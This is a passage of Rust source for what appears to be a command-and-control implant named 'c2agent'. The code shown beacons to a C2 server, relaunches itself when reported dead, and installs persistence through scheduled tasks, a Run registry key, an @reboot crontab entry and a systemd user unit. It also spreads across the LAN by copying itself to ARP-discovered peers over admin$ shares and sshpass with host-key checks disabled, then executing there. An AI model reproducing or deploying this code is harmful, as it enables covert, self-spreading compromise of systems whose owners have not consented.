        let mut out = String::from("clone watchers:");
        for l in lines {
            out.push('\n');
            out.push_str(&l);
        }
        return (out, 0);
    }

    // start
    {
        let map = CLONES.lock().unwrap();
        if map.contains_key(&target) {
            return (format!("clone: watcher for {} already running", target), 1);
        }
    }
    if command.is_empty() {
        return ("clone: 'command' (relaunch cmd) required".to_string(), 1);
    }

    let watcher = Arc::new(new_watcher());
    let wc = watcher.clone();
    let cli = client.clone();
    let (srv, tkn, tgt) = (server.to_string(), token.to_string(), target.clone());
    let handle = thread::spawn(move || {
        while !wc.stop.load(Ordering::SeqCst) {
            let url = format!("{}/api/clone/status/{}", srv, tgt);
            let st;
            match cli
                .get(&url)
                .header("X-Agent-Token", &tkn)
                .timeout(Duration::from_secs(15))
                .send()
            {
                Ok(resp) if resp.status() == reqwest::StatusCode::NOT_FOUND => {
                    *wc.status.lock().unwrap() = "unknown".to_string();
                    *wc.last_check.lock().unwrap() = "target gone".to_string();
                    st = String::new();
                }
                Ok(resp) if resp.status().is_success() => {
                    let body: serde_json::Value =
                        resp.json().unwrap_or(serde_json::Value::Null);
                    st = body
                        .get("status")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())
                        .unwrap_or_else(|| "unknown".to_string());
                    *wc.status.lock().unwrap() = st.clone();
                    *wc.last_check.lock().unwrap() = clone_now_str();
                }
                Ok(resp) => {
                    st = format!("http {}", resp.status().as_u16());
                    *wc.status.lock().unwrap() = st.clone();
                    *wc.last_check.lock().unwrap() = clone_now_str();
                }
                Err(_) => {
                    st = "error".to_string();
                    *wc.status.lock().unwrap() = st.clone();
                    *wc.last_check.lock().unwrap() = clone_now_str();
                }
            }
            if (st == "dead" || st == "stale") && !wc.command.is_empty() {
                if wc.stop.load(Ordering::SeqCst) {
                    break;
                }
                *wc.relaunches.lock().unwrap() += 1;
                println!("[*] clone: target {} {} -> relaunching", tgt, st);
                relaunch_detached(&wc.command);
            }
            for _ in 0..wc.interval {
                if wc.stop.load(Ordering::SeqCst) {
                    break;
                }
                thread::sleep(Duration::from_secs(1));
            }
        }
    });

    let mut map = CLONES.lock().unwrap();
    map.insert(
        target.clone(),
        CloneWatcher {
            status: Mutex::new("starting".to_string()),
            last_check: Mutex::new("never".to_string()),
            relaunches: Mutex::new(0),
            command: command.clone(),
            interval,
            stop: watcher.stop.clone(),
            handle: Some(handle),
        },
    );

    (
        format!(
            "clone: watcher started on target {} (every {}s, restart cmd: {})",
            target, interval, command
        ),
        0,
    )
}

// ------------------------------------------------------------ persistence / lateral

fn first_line(s: &str) -> String {
    s.lines().next().unwrap_or("").trim().to_string()
}

fn self_path() -> String {
    if let Ok(p) = env::current_exe() {
        let s = p.to_string_lossy().to_string();
        if !s.is_empty() {
            return s;
        }
    }
    env::args().next().unwrap_or_else(|| "agent".to_string())
}

fn file_name_base(p: &str) -> String {
    Path::new(p).file_name().unwrap_or_default().to_string_lossy().to_string()
}

fn relaunch_cmd(self_path: &str, server: &str, token: &str, interval: u64, jitter: u64) -> String {
    let q = if env::consts::OS == "windows" { "\"" } else { "'" };
    format!(
        "{q}{self_path}{q} --server {server} --token {token} --interval {interval} --jitter {jitter}"
    )
}

fn do_persistence(server: &str, token: &str, interval: u64, jitter: u64) -> (String, i32) {
    let self_path = self_path();
    let relaunch = relaunch_cmd(&self_path, server, token, interval, jitter);
    let dest: PathBuf;
    if env::consts::OS == "windows" {
        let appdata = env::var("APPDATA")
            .or_else(|_| env::var("USERPROFILE"))
            .unwrap_or_else(|_| ".".to_string());
        let dir = PathBuf::from(appdata)
            .join("Microsoft").join("Windows").join("c2update");
        let _ = fs::create_dir_all(&dir);
        dest = dir.join("c2agent.exe");
    } else {
        let dir = home_file(".config/c2update");
        let _ = fs::create_dir_all(&dir);
        dest = dir.join(file_name_base(&self_path));
    }
    if fs::copy(&self_path, &dest).is_err() {
        return (format!("persistence: failed to copy self to {}", dest.to_string_lossy()), 1);
    }
    let mut out = format!("persistence: copied self to {}", dest.to_string_lossy());

    if env::consts::OS == "windows" {
        let progdata = env::var("ProgramData")
            .or_else(|_| env::var("ALLUSERSPROFILE"))
            .unwrap_or_else(|_| "C:\\ProgramData".to_string());
        let launcher_dir = PathBuf::from(progdata).join("c2update");
        if fs::create_dir_all(&launcher_dir).is_err() {
            return ("persistence: failed to write launcher (cannot mkdir)".to_string(), 1);
        }
        let wrapper = launcher_dir.join("c2relaunch.cmd");
        if fs::write(&wrapper, format!("@echo off\r\nstart \"\" /b {}\r\n", relaunch)).is_err() {
            return (format!("persistence: failed to write launcher {}", wrapper.to_string_lossy()), 1);
        }
        out.push_str(&format!("\npersistence: wrote launcher {}", wrapper.to_string_lossy()));
        let mut ok = false;
        let cmd = format!(
            "schtasks /Create /TN \"c2agent-persist\" /TR \"{}\" /SC ONLOGON /RL HIGHEST /F",
            wrapper.to_string_lossy()
        );
        let (sh, rc) = run_shell(&cmd, 60);
        if rc == 0 {
            ok = true;
        } else {
            out.push_str(&format!("\n  schtasks err: {}", first_line(&sh)));
            let reg = format!(
                "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d \"{}\" /f",
                wrapper.to_string_lossy()
            );
            let (sh2, rc2) = run_shell(&reg, 60);
            if rc2 == 0 {
                ok = true;
            } else {
                out.push_str(&format!("\n  reg err: {}", first_line(&sh2)));
            }
        }
        out.push_str(if ok {
            "\n  launch hook registered (schtasks)"
        } else {
            "\n  no launch hook registered"
        });
        return (out, if ok { 0 } else { 1 });
    }

    let mut ok_cron = false;
    let mut ok_sys = false;
    let line = format!("@reboot {relaunch} # c2agent-persist");
    let cmd = format!(
        "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"{line}\") | crontab -"
    );
    let (sh, rc) = run_shell(&cmd, 60);
    if rc == 0 {
        ok_cron = true;
    } else {
        out.push_str(&format!("\n  crontab err: {}", first_line(&sh)));
    }
    let unit = home_file(".config/c2update/c2-update.service");
    let unit_text = format!(
        "[Unit]\nDescription=c2 agent update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c \"{}\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n",
        relaunch
    );
    if fs::write(&unit, unit_text).is_err() {
        out.push_str(&format!(
            "\n  systemctl err: cannot write unit {}",
            unit.to_string_lossy()
        ));
    } else {
        let syscmd = format!(
            "systemctl --user daemon-reload 2>&1; systemctl --user enable --now {} 2>&1",
            unit.to_string_lossy()
        );
        let (sh2, rc2) = run_shell(&syscmd, 60);
        if rc2 == 0 {
            ok_sys = true;
        } else {
            out.push_str(&format!("\n  systemctl err: {}", first_line(&sh2)));
        }
    }
    out.push_str(if ok_cron || ok_sys {
        "\n  launch hook registered (crontab/systemd)"
    } else {
        "\n  no launch hook registered"
    });
    (out, if ok_cron || ok_sys { 0 } else { 1 })
}

fn subnet_base(ip: &str) -> String {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() >= 3 {
        format!("{}.{}.{}", parts[0], parts[1], parts[2])
    } else {
        ip.to_string()
    }
}

fn ip_to_u32(ip: &str) -> u32 {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() != 4 {
        return 0;
    }
    let mut v: u32 = 0;
    for p in parts {
        match p.parse::<u32>() {
            Ok(o) if o <= 255 => v = (v << 8) | o,
            _ => return 0,
        }
    }
    v
}

fn u32_to_ip(v: u32) -> String {
    format!("{}.{}.{}.{}", (v >> 24) & 0xff, (v >> 16) & 0xff, (v >> 8) & 0xff, v & 0xff)
}

fn collect_peers(
    txt: &str,
    base: &str,
    own: u32,
    seen: &mut std::collections::HashSet<u32>,
    list: &mut Vec<u32>,
) {
    if txt.is_empty() {
        return;
    }
    let prefix = format!("{base}.");
    let chars: Vec<char> = txt.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if !c.is_ascii_digit() && c != '.' {
            i += 1;
            continue;
        }
        let mut j = i;
        while j < chars.len() && (chars[j].is_ascii_digit() || chars[j] == '.') {
            j += 1;
        }
        let tok: String = chars[i..j].iter().collect();
        i = j;
        let ip = ip_to_u32(&tok);
        if ip == 0 || ip == own {
            continue;
        }
        if (ip >> 24) & 0xff == 0 || (ip >> 24) & 0xff >= 224 {
            continue;
        }
        if !tok.starts_with(&prefix) {
            continue;
        }
        if seen.insert(ip) {
            list.push(ip);
        }
    }
}

fn deploy_lateral_win(
    host: &str, user: &str, pass: &str, self_path: &str,
    server: &str, token: &str, interval: u64, jitter: u64,
) -> String {
    let name = file_name_base(self_path);
    let share = format!("\\\\{host}\\admin$");
    let cmd = format!("net use \"{share}\" /user:{user} \"{pass}\"");
    let (sh, rc) = run_shell(&cmd, 30);
    if rc != 0 {
        return format!("failed (net use: {})", first_line(&sh));
    }
    let remote = format!("\\\\{host}\\admin$\\{name}");
    let cmd = format!("copy /y \"{self_path}\" \"{remote}\"");
    let (sh, rc) = run_shell(&cmd, 60);
    if rc != 0 {
        let _ = run_shell(&format!("net use \"{share}\" /delete /y"), 20);
        return format!("failed (copy: {})", first_line(&sh));
    }
    let relaunch = format!(
        "\"c:\\windows\\{name}\" --server {server} --token {token} --interval {interval} --jitter {jitter}"
    );
    let cmd = format!(
        "schtasks /Create /S {host} /TN \"c2agent-lateral\" /TR \"{relaunch}\" /SC ONLOGON /RU {user} /RP {pass} /RL HIGHEST /F"
    );
    let (sh, rc) = run_shell(&cmd, 30);
    let _ = run_shell(&format!("net use \"{share}\" /delete /y"), 20);
    if rc != 0 {
        return format!("deployed (file dropped; task: {})", first_line(&sh));
    }
    "deployed (file dropped + scheduled c2agent-lateral)".to_string()
}

fn deploy_lateral_unix(
    host: &str, user: &str, pass: &str, self_path: &str,
    server: &str, token: &str, interval: u64, jitter: u64,
) -> String {
    let (_, rc) = run_shell("command -v sshpass", 10);
    if rc != 0 {
        return "skipped (sshpass not installed)".to_string();
    }
    let name = file_name_base(self_path);
    let relaunch = format!(
        "'/tmp/{name}' --server {server} --token {token} --interval {interval} --jitter {jitter}"
    );
    let cmd = format!(
        "sshpass -p '{pass}' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '{self_path}' {user}@{host}:/tmp/{name}"
    );
    let (sh, rc) = run_shell(&cmd, 60);
    if rc != 0 {
        return format!("failed (scp: {})", first_line(&sh));
    }
    let cmd = format!(
        "sshpass -p '{pass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {user}@{host} '{relaunch} &>/dev/null &'"
    );
    let (sh, rc) = run_shell(&cmd, 30);
    if rc != 0 {
        return format!("deployed (file uploaded; launch: {})", first_line(&sh));
    }
    "deployed (file uploaded + launched)".to_string()
}

fn do_lateral(
    server: &str,
    token: &str,
    interval: u64,
    jitter: u64,
    args: serde_json::Map<String, serde_json::Value>,
) -> (String, i32) {
    let get = |k: &str| -> String {
        args.get(k)
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string()
    };
    let subnet = get("subnet");
    let mut user = get("user");
    let mut pass = get("pass");
    if user.is_empty() {
        user = env::var("C2_LAT_USER").unwrap_or_default();
    }
    if pass.is_empty() {
        pass = env::var("C2_LAT_PASS").unwrap_or_default();
    }
    let self_path = self_path();

    let me = local_ip();
    let base = if !subnet.trim().is_empty() {
        subnet_base(subnet.trim())
    } else if me.matches('.').count() == 3 {
        subnet_base(&me)
    } else {
        String::new()
    };
    if base.is_empty() {
        return ("lateral: no LAN peers found".to_string(), 1);
    }

    let own = ip_to_u32(&me);
    let mut seen = std::collections::HashSet::new();
    let mut list: Vec<u32> = Vec::new();
    let (out1, _) = run_shell("arp -a", 20);
    collect_peers(&out1, &base, own, &mut seen, &mut list);
    if env::consts::OS != "windows" {
        let (out2, _) = run_shell("ip neigh", 20);
        collect_peers(&out2, &base, own, &mut seen, &mut list);
    }
    list.sort_unstable();
    list.truncate(30);
    if list.is_empty() {
        return ("lateral: no LAN peers found".to_string(), 1);
    }
    let peers: Vec<String> = list.iter().map(|v| u32_to_ip(*v)).collect();
    let mut out = format!("lateral: {} peer(s): {}", peers.len(), peers.join(","));
    let mut deployed: i32 = 0;
    let mut failed: i32 = 0;
    let mut skipped: i32 = 0;
    for host in &peers {
        let status;
        if user.is_empty() || pass.is_empty() {
            status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)".to_string();
            skipped += 1;
        } else if env::consts::OS == "windows" {
            status = deploy_lateral_win(
                host, &user, &pass, &self_path, server, token, interval, jitter,
            );
        } else {
            status = deploy_lateral_unix(
                host, &user, &pass, &self_path, server, token, interval, jitter,
            );
        }
        out.push_str(&format!("\n  {host}: {status}"));
        if status.starts_with("deployed") {
            deployed += 1;
        } else if status.starts_with("skipped") {
            skipped += 1;
        } else {
            failed += 1;
        }
    }
    out.push_str(&format!(
        "\nlateral: deployed={deployed} failed={failed} skipped={skipped}"
    ));
    (out, 0)
}

// ------------------------------------------------------------------- main

fn main() {
    let mut server = String::new();
    let mut token = String::new();
    let mut interval: u64 = 10;
    let mut jitter: u64 = 0;
    let mut state_file: Option<PathBuf> = None;
    let mut verbose = false;

    let mut args = env::args().skip(1);
    while let Some(arg) = args.next() {
        match arg.as_str() {
            "--server" => server = args.next().unwrap_or_default(),
            "--token" => token = args.next().unwrap_or_default(),
            "--interval" => interval = args.next().and_then(|v| v.parse().ok()).unwrap_or(10),
            "--jitter" => jitter = args.next().and_then(|v| v.parse().ok()).unwrap_or(0),
            "--state" => state_file = Some(args.next().map(PathBuf::from).unwrap_or_default()),
            "--verbose" => verbose = true,
            _ => {}
        }
    }
    if server.is_empty() {
        server = env::var("C2_SERVER").unwrap_or_default();
    }
    if token.is_empty() {
        token = env::var("C2_TOKEN").unwrap_or_default();
    }
    if server.is_empty() || token.is_empty() {
        eprintln!("usage: c2agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
        std::process::exit(1);
    }

    let state_file = state_file.unwrap_or_else(|| home_file(".c2agent_rs.json"));
    let mut agent = Agent::new(&server, &token, interval, jitter, verbose, state_file);
    agent.run();
}
